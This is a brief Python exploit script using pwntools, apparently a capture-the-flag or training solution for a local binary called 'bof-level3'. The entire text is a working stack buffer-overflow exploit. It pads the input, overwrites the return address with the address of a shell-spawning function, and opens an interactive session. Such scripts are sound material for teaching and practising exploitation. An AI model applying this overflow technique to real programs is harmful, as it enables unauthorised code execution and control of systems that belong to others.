#!/usr/bin/env python

from pwn import *

p = process("./bof-level3")

getShellAddr = p64(0x4006e0)

buf = "A"*32 + "ABCDEFGHabcdefgh" + "B"*8 + getShellAddr

# This prints the output from the program
print(p.recv())

print("sending " + buf)

p.sendline(buf)

# This allows direct interaction with the application
p.interactive()
